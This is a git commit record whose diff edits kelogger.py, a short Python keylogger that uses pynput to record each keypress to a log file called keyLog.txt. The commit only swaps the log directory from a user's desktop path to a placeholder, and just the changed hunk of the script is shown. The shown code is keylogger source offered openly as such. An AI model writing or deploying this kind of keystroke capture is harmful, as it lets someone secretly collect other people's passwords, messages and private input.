40bd31ee0bd0186bf8c1b0c22b47bf0e131a8e2e
Madhavan Mani <maadhu97.madhavan@gmail.com>
2019-10-17 11:40:21 +0530

    Update kelogger.py

--- kelogger.py
+++ kelogger.py
@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Listener
 import logging
-log_dir = r"C:/users/infosec/desktop/"
+log_dir = r"C:/path"
 logging.basicConfig(filename = (log_dir + "keyLog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
 def on_press(key):
   logging.info(str(key))
